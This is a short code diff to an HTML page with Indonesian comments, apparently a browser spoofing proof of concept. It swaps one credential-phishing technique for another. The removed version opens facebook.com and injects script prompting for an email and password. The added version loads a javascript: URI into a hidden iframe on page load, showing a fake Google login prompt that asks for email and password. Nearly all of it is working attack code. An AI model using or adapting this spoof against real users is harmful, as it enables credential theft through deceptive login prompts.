@@ -8,30 +8,12 @@
         // 1. Buka tab baru ke domain target (untuk spoof address bar)
         let win = window.open("https://www.facebook.com:80", "_blank");
 
-        // 2. Setelah delay kecil (20–50ms), tampilkan prompt langsung
-        setTimeout(() => {
-          try {
-            win.document.write(`
-              <script>
-                setTimeout(() => {
-                  let email = prompt('To continue, please enter your email:');
-                  let pass = prompt('Now enter your password:');
-                  alert('Captured:\\nEmail: ' + email + '\\nPassword: ' + pass);
-                }, 500);
-              <\/script>
-              <style>
-                body { background: white; }
-              </style>
-            `);
-            win.document.close();
-          } catch (e) {
-            console.warn("Blocked by browser:", e);
-          }
-        }, 30); // Timing kritis: injeksi sebelum navigasi target aktif
+        // Triggers fake prompt via javascript URI
+        document.getElementById("iframe").src =
+          'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
       }
-
-      // Jalankan otomatis saat halaman dimuat
       spoof();
     </script>
+    <iframe id="iframe" style="display:none;" src=""></iframe>
   </body>
 </html>
